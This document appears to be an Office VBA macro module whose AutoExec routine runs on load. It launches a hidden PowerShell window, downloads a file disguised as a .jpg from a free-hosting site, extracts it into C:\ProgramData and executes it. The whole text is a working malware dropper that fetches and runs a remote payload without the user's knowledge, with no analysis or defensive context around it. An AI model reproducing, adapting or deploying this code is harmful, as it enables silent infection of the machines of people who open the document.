Attribute VB_Name = "NewMacros"
Sub AutoExec()
 Dim x
 x = Shell("POWERSHELL.EXE " & "powershell -windowstyle hidden Invoke-WebRequest -uri 'https://unmeasurable-medici.000webhostapp.com/0.jpg' -outfile 'C:\\ProgramData\\0.jpg';Expand-Archive C:\\ProgramData\\0.jpg -DestinationPath C:\\ProgramData\\; Start-Process 'C:\\ProgramData\\0.jpg'")
End Sub


